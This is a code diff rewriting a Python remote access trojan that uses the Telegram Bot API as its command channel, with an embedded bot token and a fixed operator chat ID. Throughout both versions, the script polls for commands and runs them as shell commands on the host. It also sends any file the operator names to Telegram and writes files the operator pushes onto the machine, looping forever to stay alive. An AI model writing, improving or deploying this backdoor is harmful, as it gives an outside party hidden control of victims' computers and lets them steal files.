@@ -1,73 +1,98 @@
-from telebot import TeleBot
-from os import chdir
+import requests
 from subprocess import check_output
+from os import chdir
 from time import sleep
 
-bot = TeleBot('6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA')
+url = 'https://api.telegram.org/bot6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA/'
 
-
-def send(text):
-    bot.send_message(1222961630, text)
-
-
-@bot.message_handler(commands=['start'])
-def start(msg):
-    if msg.chat.id != 1222961630:
-        bot.send_message(msg.chat.id, 'error')
+def send_msg(text):
+    if len(text) > 4095:
+        for i in range(0, len(text), 4095):
+            requests.get(url + 'SendMessage?chat_id=1222961630&text=' + text[i:i+4095])
+    elif len(text) == 0:
+        requests.get(url + 'SendMessage?chat_id=1222961630&text=ok')
     else:
-        send('/cmd ...\n/download ...\nsend file to upload it')
+        requests.get(url + 'SendMessage?chat_id=1222961630&text=' + text)
 
 
-@bot.message_handler(commands=['cmd'])
-def cmd(msg):
-    cmd = msg.text[5:]
+def send_doc(path):
+    try:
+        data = {'chat_id': 1222961630,}
+        files = {'document': open(path, 'rb')}
+        requests.get(url + 'SendDocument', data=data, files=files)
+    except Exception as e:
+        send_msg(str(e))
 
-    if cmd.startswith('cd '):
-        try:
-            chdir(cmd[3:])
-            send('ok')
-        except Exception as e:
-            send(e)
-    else:
-        try:
-            out = check_output(cmd, shell=True).decode('cp866')
 
-            if len(out) > 4095:
-                for i in range(0, len(out), 4095):
-                    send(out[i:i+4095])
-            elif len(out) == 0:
-                send('ok')
+def get_last_msg():
+    json = requests.get(url + 'getUpdates?offset=-1').json()
+    try:
+        res = [False, json['result'][0]['message']['date'], json['result'][0]['message']['text']]
+    except KeyError:
+        res = [True, json['result'][0]['message']['date'], json['result'][0]['message']['document']['file_id'], json['result'][0]['message']['document']['file_name']]
+    return res
+
+
+def upload_doc(file_id, file_name):
+    try:
+        TOKEN = '6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA'
+        url = f'https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}'
+        response = requests.get(url).json()
+        file_path = response['result']['file_path']
+        file_url = f'https://api.telegram.org/file/bot{TOKEN}/{file_path}'
+        response = requests.get(file_url)
+        with open(file_name, 'wb') as f:
+            f.write(response.content)
+        
+        send_msg('ok')
+
+    except Exception as e:
+        send_msg(str(e))
+
+
+def what_to_do_with_text(text: str):
+    text = text[1:]
+    if text.startswith('start'):
+        send_msg('/cmd ...\n/download ...\nsend file to upload it')
+
+    elif text.startswith('cmd'):
+        text = text[4:]
+        if text.startswith('cd '):
+            try:
+                chdir(text[4:])
+                send_msg('ok')
+            except Exception as e:
+                send_msg(str(e))
+        else:
+            try:
+                send_msg(check_output(text, shell=True).decode('cp866'))
+            except Exception as e:
+                send_msg(str(e))
+    elif text.startswith('download'):
+        text = text[9:]
+        send_doc(text)
+    
+
+
+def bot():
+    date = None
+    last_msg = None
+
+    while True:
+        last_msg = get_last_msg()
+        if last_msg[1] != date:
+            date = last_msg[1]
+
+            if last_msg[0] == False:
+                what_to_do_with_text(last_msg[2])
             else:
-                send(out)
-        except Exception as e:
-            send(e)
+                upload_doc(last_msg[2], last_msg[3])
+        sleep(2)
 
 
-@bot.message_handler(commands=['download'])
-def download(msg):
-    try:
-        bot.send_document(1222961630, document=open(msg.text[10:]))
-    except Exception as e:
-            send(e)
-
-
-@bot.message_handler(content_types=['document'])
-def upload(message):
-    try:
-        file_id = message.document.file_id
-        file_name = message.document.file_name
-        file_info = bot.get_file(file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        with open(file_name, 'wb') as new_file:
-            new_file.write(downloaded_file)
-        send('ok')
-    except Exception as e:
-        send(e)
-
-
-while True:
-    try:
-        send('bot started')
-        bot.polling()
-    except:
-        sleep(5)
+if __name__ == '__main__':
+    while True:
+        try:
+            bot()
+        except:
+            sleep(3)
